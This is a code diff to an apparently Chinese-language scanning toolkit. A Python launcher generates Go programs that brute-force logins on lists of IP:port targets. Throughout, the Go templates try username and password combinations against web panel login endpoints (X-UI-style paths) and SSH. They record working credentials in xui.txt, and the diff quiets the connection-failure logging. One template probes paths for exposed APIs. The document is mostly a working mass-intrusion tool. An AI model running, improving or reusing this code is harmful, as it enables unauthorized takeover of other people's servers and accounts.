@@ -19,6 +19,7 @@ import (
 	"fmt"
 	"io/ioutil"
 	"net/http"
+	"net/url"
 	"os"
 	"strings"
 	"sync"
@@ -71,7 +72,7 @@ func writeResultToFile(file *os.File, text string) {
 	file.WriteString(text)
 }
 
-func processIP(ipPort string, file *os.File, usernames []string, passwords []string) {
+func processIP(line string, file *os.File, usernames []string, passwords []string) {
 	defer func() {
 		atomic.AddInt64(&completedCount, 1)
 		<-semaphore
@@ -79,6 +80,14 @@ func processIP(ipPort string, file *os.File, usernames []string, passwords []str
 	}()
 	
 	semaphore <- struct{}{}
+
+	var ipPort string
+	u, err := url.Parse(strings.TrimSpace(line))
+	if err == nil && u.Host != "" {
+		ipPort = u.Host
+	} else {
+		ipPort = strings.TrimSpace(line)
+	}
 
 	parts := strings.Split(ipPort, ":")
 	if len(parts) != 2 {
@@ -93,23 +102,22 @@ func processIP(ipPort string, file *os.File, usernames []string, passwords []str
 			var resp *http.Response
 			
 			ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
-			url := fmt.Sprintf("http://%s:%s/login", ip, port)
-			resp, err = postRequest(ctx, url, username, password)
+			checkUrl := fmt.Sprintf("http://%s:%s/login", ip, port)
+			resp, err = postRequest(ctx, checkUrl, username, password)
 			cancel()
 
 			if err != nil {
 				ctx2, cancel2 := context.WithTimeout(context.Background(), 10*time.Second)
-				url = fmt.Sprintf("https://%s:%s/login", ip, port)
-				resp, err = postRequest(ctx2, url, username, password)
+				checkUrl = fmt.Sprintf("https://%s:%s/login", ip, port)
+				resp, err = postRequest(ctx2, checkUrl, username, password)
 				cancel2()
 			}
 
 			if err != nil {
-				fmt.Printf("[-] 连接失败 %s:%s - %v\\n", ip, port, err)
+				// fmt.Printf("[-] 连接失败 %s:%s - %v\\n", ip, port, err)
 				continue
 			}
 			
-			fmt.Printf("[INFO] 响应 from %s:%s | Status: %d\\n", ip, port, resp.StatusCode)
 			defer resp.Body.Close()
 
 			if resp.StatusCode == http.StatusOK {
@@ -168,6 +176,11 @@ func main() {
 	usernames := {user_list}
 	passwords := {pass_list}
 
+    if len(usernames) == 0 || len(passwords) == 0 {
+        fmt.Println("错误：用户名或密码列表为空。请检查您的 username.txt 和 password.txt 文件并确保它们包含内容。")
+        return
+    }
+
 	outputFile := "xui.txt"
 	file, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
 	if err != nil {
@@ -185,9 +198,9 @@ func main() {
 	startTime = time.Now()
 	go updateProgress()
 
-	for _, ipPort := range batch {
+	for _, line := range batch {
 		wg.Add(1)
-		go processIP(ipPort, file, usernames, passwords)
+		go processIP(line, file, usernames, passwords)
 	}
 
 	wg.Wait()
@@ -205,6 +218,7 @@ import (
 	"fmt"
 	"io/ioutil"
 	"net/http"
+	"net/url"
 	"os"
 	"strings"
 	"sync"
@@ -260,7 +274,7 @@ func writeResultToFile(file *os.File, text string) {
 	file.WriteString(text)
 }
 
-func processIP(ipPort string, file *os.File, usernames []string, passwords []string) {
+func processIP(line string, file *os.File, usernames []string, passwords []string) {
 	defer func() {
 		atomic.AddInt64(&completedCount, 1)
 		<-semaphore
@@ -268,6 +282,14 @@ func processIP(ipPort string, file *os.File, usernames []string, passwords []str
 	}()
 	
 	semaphore <- struct{}{}
+
+	var ipPort string
+	u, err := url.Parse(strings.TrimSpace(line))
+	if err == nil && u.Host != "" {
+		ipPort = u.Host
+	} else {
+		ipPort = strings.TrimSpace(line)
+	}
 
 	parts := strings.Split(ipPort, ":")
 	if len(parts) != 2 {
@@ -282,23 +304,22 @@ func processIP(ipPort string, file *os.File, usernames []string, passwords []str
 			var resp *http.Response
 
 			ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
-			url := fmt.Sprintf("http://%s:%s/api/v1/login", ip, port)
-			resp, err = postRequest(ctx, url, username, password)
+			checkUrl := fmt.Sprintf("http://%s:%s/api/v1/login", ip, port)
+			resp, err = postRequest(ctx, checkUrl, username, password)
 			cancel()
 
 			if err != nil {
 				ctx2, cancel2 := context.WithTimeout(context.Background(), 10*time.Second)
-				url = fmt.Sprintf("https://%s:%s/api/v1/login", ip, port)
-				resp, err = postRequest(ctx2, url, username, password)
+				checkUrl = fmt.Sprintf("https://%s:%s/api/v1/login", ip, port)
+				resp, err = postRequest(ctx2, checkUrl, username, password)
 				cancel2()
 			}
 
 			if err != nil {
-				fmt.Printf("[-] 连接失败 %s:%s - %v\\n", ip, port, err)
+				// fmt.Printf("[-] 连接失败 %s:%s - %v\\n", ip, port, err)
 				continue
 			}
 			
-			fmt.Printf("[INFO] 响应 from %s:%s | Status: %d\\n", ip, port, resp.StatusCode)
 			defer resp.Body.Close()
 
 			if resp.StatusCode == http.StatusOK {
@@ -357,6 +378,11 @@ func main() {
 	usernames := {user_list}
 	passwords := {pass_list}
 
+    if len(usernames) == 0 || len(passwords) == 0 {
+        fmt.Println("错误：用户名或密码列表为空。请检查您的 username.txt 和 password.txt 文件并确保它们包含内容。")
+        return
+    }
+
 	outputFile := "xui.txt"
 	file, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
 	if err != nil {
@@ -374,9 +400,9 @@ func main() {
 	startTime = time.Now()
 	go updateProgress()
 
-	for _, ipPort := range batch {
+	for _, line := range batch {
 		wg.Add(1)
-		go processIP(ipPort, file, usernames, passwords)
+		go processIP(line, file, usernames, passwords)
 	}
 	
 	wg.Wait()
@@ -394,6 +420,7 @@ import (
 	"fmt"
 	"io/ioutil"
 	"net/http"
+	"net/url"
 	"os"
 	"strings"
 	"sync"
@@ -451,7 +478,7 @@ func writeResultToFile(file *os.File, text string) {
 	file.WriteString(text)
 }
 
-func processIP(ipPort string, file *os.File, usernames []string, passwords []string) {
+func processIP(line string, file *os.File, usernames []string, passwords []string) {
 	defer func() {
 		atomic.AddInt64(&completedCount, 1)
 		<-semaphore
@@ -459,6 +486,14 @@ func processIP(ipPort string, file *os.File, usernames []string, passwords []str
 	}()
 
 	semaphore <- struct{}{}
+
+	var ipPort string
+	u, err := url.Parse(strings.TrimSpace(line))
+	if err == nil && u.Host != "" {
+		ipPort = u.Host
+	} else {
+		ipPort = strings.TrimSpace(line)
+	}
 
 	parts := strings.Split(ipPort, ":")
 	if len(parts) != 2 {
@@ -470,15 +505,14 @@ func processIP(ipPort string, file *os.File, usernames []string, passwords []str
 	for _, username := range usernames {
 		for _, password := range passwords {
 			ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
-			url := fmt.Sprintf("http://%s:%s/hui/auth/login", ip, port)
-			resp, err := postRequest(ctx, url, username, password)
+			checkUrl := fmt.Sprintf("http://%s:%s/hui/auth/login", ip, port)
+			resp, err := postRequest(ctx, checkUrl, username, password)
 			cancel()
 			if err != nil {
-				fmt.Printf("[-] 连接失败 %s:%s - %v\\n", ip, port, err)
+				// fmt.Printf("[-] 连接失败 %s:%s - %v\\n", ip, port, err)
 				continue
 			}
 			
-			fmt.Printf("[INFO] 响应 from %s:%s | Status: %d\\n", ip, port, resp.StatusCode)
 			defer resp.Body.Close()
 
 			if resp.StatusCode == http.StatusOK {
@@ -539,6 +573,11 @@ func main() {
 	usernames := {user_list}
 	passwords := {pass_list}
 
+    if len(usernames) == 0 || len(passwords) == 0 {
+        fmt.Println("错误：用户名或密码列表为空。请检查您的 username.txt 和 password.txt 文件并确保它们包含内容。")
+        return
+    }
+
 	outputFile := "xui.txt"
 	file, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
 	if err != nil {
@@ -556,9 +595,9 @@ func main() {
 	startTime = time.Now()
 	go updateProgress()
 
-	for _, ipPort := range batch {
+	for _, line := range batch {
 		wg.Add(1)
-		go processIP(ipPort, file, usernames, passwords)
+		go processIP(line, file, usernames, passwords)
 	}
 
 	wg.Wait()
@@ -576,6 +615,7 @@ import (
 	"fmt"
 	"io/ioutil"
 	"net/http"
+	"net/url"
 	"os"
 	"strings"
 	"sync"
@@ -636,7 +676,7 @@ func writeResultToFile(file *os.File, text string) {
 	file.WriteString(text)
 }
 
-func processIP(ipPort string, file *os.File, usernames []string, passwords []string) {
+func processIP(line string, file *os.File, usernames []string, passwords []string) {
 	defer func() {
 		atomic.AddInt64(&completedCount, 1)
 		<-semaphore
@@ -645,26 +685,33 @@ func processIP(ipPort string, file *os.File, usernames []string, passwords []str
 
 	semaphore <- struct{}{}
 
+	var ipPort string
+	u, err := url.Parse(strings.TrimSpace(line))
+	if err == nil && u.Host != "" {
+		ipPort = u.Host
+	} else {
+		ipPort = strings.TrimSpace(line)
+	}
+
 	parts := strings.Split(ipPort, ":")
 	if len(parts) != 2 {
 		return
 	}
 	ip := parts[0]
 	port := parts[1]
-	url := fmt.Sprintf("http://%s:%s/login", ip, port)
+	checkUrl := fmt.Sprintf("http://%s:%s/login", ip, port)
 
 	for _, username := range usernames {
 		for _, password := range passwords {
 			ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
-			resp, err := postRequest(ctx, url, username, password)
+			resp, err := postRequest(ctx, checkUrl, username, password)
 			cancel()
 
 			if err != nil {
-				fmt.Printf("[-] 连接失败 %s:%s - %v\\n", ip, port, err)
+				// fmt.Printf("[-] 连接失败 %s:%s - %v\\n", ip, port, err)
 				continue
 			}
 			
-			fmt.Printf("[INFO] 响应 from %s:%s | Status: %d\\n", ip, port, resp.StatusCode)
 			defer resp.Body.Close()
 			
 			if resp.StatusCode != 200 {
@@ -727,6 +774,11 @@ func main() {
 	usernames := {user_list}
 	passwords := {pass_list}
 
+    if len(usernames) == 0 || len(passwords) == 0 {
+        fmt.Println("错误：用户名或密码列表为空。请检查您的 username.txt 和 password.txt 文件并确保它们包含内容。")
+        return
+    }
+
 	outputFile := "xui.txt"
 	file, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
 	if err != nil {
@@ -744,9 +796,9 @@ func main() {
 	startTime = time.Now()
 	go updateProgress()
 
-	for _, ipPort := range batch {
+	for _, line := range batch {
 		wg.Add(1)
-		go processIP(ipPort, file, usernames, passwords)
+		go processIP(line, file, usernames, passwords)
 	}
 
 	wg.Wait()
@@ -764,6 +816,7 @@ import (
 	"fmt"
 	"io/ioutil"
 	"net/http"
+	"net/url"
 	"os"
 	"strings"
 	"sync"
@@ -822,7 +875,7 @@ func writeResultToFile(file *os.File, text string) {
 	file.WriteString(text)
 }
 
-func processIP(ipPort string, file *os.File, usernames []string, passwords []string) {
+func processIP(line string, file *os.File, usernames []string, passwords []string) {
 	defer func() {
 		atomic.AddInt64(&completedCount, 1)
 		<-semaphore
@@ -831,26 +884,33 @@ func processIP(ipPort string, file *os.File, usernames []string, passwords []str
 
 	semaphore <- struct{}{}
 
+	var ipPort string
+	u, err := url.Parse(strings.TrimSpace(line))
+	if err == nil && u.Host != "" {
+		ipPort = u.Host
+	} else {
+		ipPort = strings.TrimSpace(line)
+	}
+
 	parts := strings.Split(ipPort, ":")
 	if len(parts) != 2 {
 		return
 	}
 	ip := parts[0]
 	port := parts[1]
-	url := fmt.Sprintf("http://%s:%s/app/api/login", ip, port)
+	checkUrl := fmt.Sprintf("http://%s:%s/app/api/login", ip, port)
 
 	for _, username := range usernames {
 		for _, password := range passwords {
 			ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
-			resp, err := postRequest(ctx, url, username, password)
+			resp, err := postRequest(ctx, checkUrl, username, password)
 			cancel()
 
 			if err != nil {
-				fmt.Printf("[-] 连接失败 %s:%s - %v\\n", ip, port, err)
+				// fmt.Printf("[-] 连接失败 %s:%s - %v\\n", ip, port, err)
 				continue
 			}
 
-			fmt.Printf("[INFO] 响应 from %s:%s | Status: %d\\n", ip, port, resp.StatusCode)
 			defer resp.Body.Close()
 
 			if resp.StatusCode != 200 {
@@ -911,6 +971,11 @@ func main() {
 	usernames := {user_list}
 	passwords := {pass_list}
 
+    if len(usernames) == 0 || len(passwords) == 0 {
+        fmt.Println("错误：用户名或密码列表为空。请检查您的 username.txt 和 password.txt 文件并确保它们包含内容。")
+        return
+    }
+
 	outputFile := "xui.txt"
 	file, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
 	if err != nil {
@@ -928,9 +993,9 @@ func main() {
 	startTime = time.Now()
 	go updateProgress()
 
-	for _, ipPort := range batch {
+	for _, line := range batch {
 		wg.Add(1)
-		go processIP(ipPort, file, usernames, passwords)
+		go processIP(line, file, usernames, passwords)
 	}
 
 	wg.Wait() 
@@ -945,6 +1010,7 @@ import (
 	"bufio"
 	"fmt"
 	"io/ioutil"
+	"net/url"
 	"os"
 	"strings"
 	"sync"
@@ -1019,7 +1085,7 @@ func writeResultToFile(file *os.File, text string) {
 	file.WriteString(text)
 }
 
-func processIP(ipPort string, file *os.File, usernames []string, passwords []string) {
+func processIP(line string, file *os.File, usernames []string, passwords []string) {
 	defer func() {
 		atomic.AddInt64(&completedCount, 1)
 		<-semaphore
@@ -1027,6 +1093,14 @@ func processIP(ipPort string, file *os.File, usernames []string, passwords []str
 	}()
 
 	semaphore <- struct{}{}
+
+	var ipPort string
+	u, err := url.Parse(strings.TrimSpace(line))
+	if err == nil && u.Host != "" {
+		ipPort = u.Host
+	} else {
+		ipPort = strings.TrimSpace(line)
+	}
 
 	parts := strings.Split(ipPort, ":")
 	if len(parts) != 2 {
@@ -1041,7 +1115,7 @@ func processIP(ipPort string, file *os.File, usernames []string, passwords []str
 		for _, password := range passwords {
 			client, success, err := trySSH(ip, port, username, password)
 			if err != nil {
-				fmt.Printf("[-] 连接失败 %s:%s - %v\\n", ip, port, err)
+				// fmt.Printf("[-] 连接失败 %s:%s - %v\\n", ip, port, err)
 			}
 			if success {
 				defer client.Close()
@@ -1305,6 +1379,11 @@ RETRY:
 	usernames := {user_list}
 	passwords := {pass_list}
 
+    if len(usernames) == 0 || len(passwords) == 0 {
+        fmt.Println("错误：用户名或密码列表为空。请检查您的 username.txt 和 password.txt 文件并确保它们包含内容。")
+        return
+    }
+
 	totalTasks = int64(len(batch))
     if totalTasks == 0 {
         fmt.Println("未加载到任何有效任务，请检查 results.txt 文件。")
@@ -1327,9 +1406,9 @@ RETRY:
 	}
 	defer file.Close()
 
-	for _, ipPort := range batch {
+	for _, line := range batch {
 		wg.Add(1)
-		go processIP(ipPort, file, usernames, passwords)
+		go processIP(line, file, usernames, passwords)
 	}
 
 	wg.Wait()
@@ -1354,6 +1433,7 @@ import (
 	"fmt"
 	"io"
 	"net/http"
+	"net/url"
 	"os"
 	"strings"
 	"sync"
@@ -1416,7 +1496,7 @@ func sendRequest(ctx context.Context, client *http.Client, fullURL string) (bool
 	}
 	defer resp.Body.Close()
 
-	fmt.Printf("[INFO] 响应 from %s | Status: %d\\n", fullURL, resp.StatusCode)
+	// fmt.Printf("[INFO] 响应 from %s | Status: %d\\n", fullURL, resp.StatusCode)
 
 	if resp.StatusCode == http.StatusOK {
 		bodyBytes, _ := io.ReadAll(resp.Body)
@@ -1437,7 +1517,7 @@ func tryBothProtocols(ipPort string, path string, client *http.Client, file *os.
 	defer cancel1()
 	success, err := sendRequest(ctx1, client, httpProbeURL)
 	if err != nil {
-		fmt.Printf("[-] 连接失败 %s - %v\\n", httpProbeURL, err)
+		// fmt.Printf("[-] 连接失败 %s - %v\\n", httpProbeURL, err)
 	}
 	if success {
 		output := fmt.Sprintf("http://%s?api=http://%s/%s", ipPort, ipPort, cleanPath)
@@ -1449,7 +1529,7 @@ func tryBothProtocols(ipPort string, path string, client *http.Client, file *os.
 	defer cancel2()
 	success, err = sendRequest(ctx2, client, httpsProbeURL)
 	if err != nil {
-		fmt.Printf("[-] 连接失败 %s - %v\\n", httpsProbeURL, err)
+		// fmt.Printf("[-] 连接失败 %s - %v\\n", httpsProbeURL, err)
 	}
 	if success {
 		output := fmt.Sprintf("https://%s?api=https://%s/%s", ipPort, ipPort, cleanPath)
@@ -1461,7 +1541,7 @@ func tryBothProtocols(ipPort string, path string, client *http.Client, file *os.
 }
 
 
-func processIP(ipPort string, file *os.File, paths []string, client *http.Client) {
+func processIP(line string, file *os.File, paths []string, client *http.Client) {
 	defer func() {
 		atomic.AddInt64(&completedCount, 1)
 		<-semaphore
@@ -1469,6 +1549,14 @@ func processIP(ipPort string, file *os.File, paths []string, client *http.Client
 	}()
 
 	semaphore <- struct{}{}
+
+	var ipPort string
+	u, err := url.Parse(strings.TrimSpace(line))
+	if err == nil && u.Host != "" {
+		ipPort = u.Host
+	} else {
+		ipPort = strings.TrimSpace(line)
+	}
 
 	for _, path := range paths {
 		if tryBothProtocols(ipPort, path, client, file) {
@@ -1520,6 +1608,11 @@ func main() {
 		return
 	}
 
+    if len(paths) == 0 {
+        fmt.Println("错误：路径/密码列表为空。请检查您的 password.txt 文件并确保它包含内容。")
+        return
+    }
+
 	file, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
 	if err != nil {
 		fmt.Println("无法打开输出文件:", err)
@@ -1538,9 +1631,9 @@ func main() {
 
 	client := &http.Client{Timeout: timeoutSeconds * time.Second}
 
-	for _, ipPort := range lines {
+	for _, line := range lines {
 		wg.Add(1)
-		go processIP(ipPort, file, paths, client)
+		go processIP(line, file, paths, client)
 	}
 
 	wg.Wait()
@@ -1674,11 +1767,10 @@ func processIP(line string, file *os.File, usernames []string, passwords []strin
 				resp, err := postRequest(ctx, finalURL, username, password, origin, referer)
 				cancel()
 				if err != nil {
-					fmt.Printf("[-] 连接失败 %s - %v\\n", finalURL, err)
+					// fmt.Printf("[-] 连接失败 %s - %v\\n", finalURL, err)
 					continue
 				}
 
-				fmt.Printf("[INFO] 响应 from %s | Status: %d\\n", finalURL, resp.StatusCode)
 				defer resp.Body.Close()
 				
 				cookies := resp.Cookies()
@@ -1734,6 +1826,11 @@ func main() {
 	usernames := {user_list}
 	passwords := {pass_list}
 
+    if len(usernames) == 0 || len(passwords) == 0 {
+        fmt.Println("错误：用户名或密码列表为空。请检查您的 username.txt 和 password.txt 文件并确保它们包含内容。")
+        return
+    }
+
 	outputFile := "xui.txt"
 	file, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
 	if err != nil {
@@ -1751,9 +1848,9 @@ func main() {
 	startTime = time.Now()
 	go updateProgress()
 
-	for _, ipPort := range batch {
+	for _, line := range batch {
 		wg.Add(1)
-		go processIP(ipPort, file, usernames, passwords)
+		go processIP(line, file, usernames, passwords)
 	}
 	
 	wg.Wait()
@@ -2088,7 +2185,7 @@ def merge_result_files(prefix: str, output_name: str, target_dir: str):
 
 
 def run_ipcx():
-    if os.path.exists('xui.txt'):
+    if os.path.exists('xui.txt') and os.path.getsize('xui.txt') > 0:
         subprocess.run([sys.executable, 'ipcx.py'])
 
 def clean_temp_files():
@@ -2097,7 +2194,7 @@ def clean_temp_files():
     shutil.rmtree(TEMP_HMSUCCESS_DIR, ignore_errors=True)
     shutil.rmtree(TEMP_HMFAIL_DIR, ignore_errors=True)
 
-    for f in ['results.txt', 'xui.go', 'ipcx.py']: 
+    for f in ['results.txt', 'xui.go', 'ipcx.py', 'go.mod', 'go.sum']: 
         if os.path.exists(f):
             try:
                 os.remove(f)
@@ -2277,9 +2374,11 @@ deb http://mirrors.aliyun.com/debian-security stable-security main contrib non-f
             print(f"✅ 模块 {module_name} 已安装")
 
     def get_go_version():
-        go_exec = "/usr/local/go/bin/go"
-        if not os.path.exists(go_exec):
-            return None
+        go_exec = shutil.which("go")
+        if not go_exec:
+            go_exec = "/usr/local/go/bin/go"
+            if not os.path.exists(go_exec):
+                return None
         try:
             out = subprocess.check_output([go_exec, "version"], stderr=subprocess.DEVNULL).decode()
             m = re.search(r"go(\\d+)\\.(\\d+)", out)
@@ -2291,7 +2390,8 @@ deb http://mirrors.aliyun.com/debian-security stable-security main contrib non-f
         version = get_go_version()
         if version and version >= (1, 20):
             print(f"✅ Go {version[0]}.{version[1]} 已安装")
-            os.environ["PATH"] = "/usr/local/go/bin:" + os.environ["PATH"]
+            if "/usr/local/go/bin" not in os.environ["PATH"]:
+                 os.environ["PATH"] = "/usr/local/go/bin:" + os.environ["PATH"]
             return
 
         print("⚠️ Go 未安装或版本过低，准备安装 Go 1.22.1 ...")
@@ -2309,36 +2409,35 @@ deb http://mirrors.aliyun.com/debian-security stable-security main contrib non-f
 
         export_line = 'export PATH="/usr/local/go/bin:$PATH"'
         profile_path = "/etc/profile"
-        with open(profile_path, "r") as f:
-            if export_line not in f.read():
-                with open(profile_path, "a") as f2:
-                    f2.write(f"\\n{export_line}\\n")
-                print(f"✅ PATH 写入 {profile_path} 完成（系统级永久生效）")
-            else:
-                print(f"✅ {profile_path} 中已存在 PATH 设置，跳过写入")
+        
+        try:
+            with open(profile_path, "r+") as f:
+                if export_line not in f.read():
+                    f.write(f"\\n{export_line}\\n")
+                    print(f"✅ PATH 写入 {profile_path} 完成（系统级永久生效）")
+                else:
+                    print(f"✅ {profile_path} 中已存在 PATH 设置，跳过写入")
+        except Exception:
+             print(f"⚠️ 无法写入 {profile_path}，请手动添加 PATH。")
+
 
         os.environ["PATH"] = "/usr/local/go/bin:" + os.environ["PATH"]
         print("✅ Go 安装完成并配置 PATH（当前脚本已生效）")
-        print("❌ 其他脚本如需使用 Go，请手动执行：source /etc/profile")
+        print("💡 如需在其他终端使用 Go，请手动执行：source /etc/profile 或重新登录。")
 
     def ensure_go_package(pkg):
-        go_exec = "/usr/local/go/bin/go"
+        go_exec = shutil.which("go") or "/usr/local/go/bin/go"
         print(f"检查 Go 包 {pkg} ...")
-        try:
-            subprocess.check_output([go_exec, "list", "-m", pkg], stderr=subprocess.DEVNULL)
-            print(f"✅ Go 模块 {pkg} 已存在")
-            return
-        except:
-            pass
-
+        
         if not os.path.exists("go.mod"):
-            subprocess.run([go_exec, "mod", "init", "xui"], check=True)
+            subprocess.run([go_exec, "mod", "init", "xui"], check=True, capture_output=True)
 
         try:
-            subprocess.run([go_exec, "get", pkg], check=True, env=os.environ.copy())
-            print(f"✅ 成功安装 Go 模块 {pkg}")
-        except subprocess.CalledProcessError:
+            subprocess.run([go_exec, "get", pkg], check=True, env=os.environ.copy(), capture_output=True, text=True)
+            print(f"✅ 成功安装/更新 Go 模块 {pkg}")
+        except subprocess.CalledProcessError as e:
             print(f"❌ 安装 {pkg} 失败，请检查网络或手动安装。")
+            print(e.stderr)
             sys.exit(1)
 
     ensure_cmd_exists("curl", ["apt", "install", "-y", "curl"])
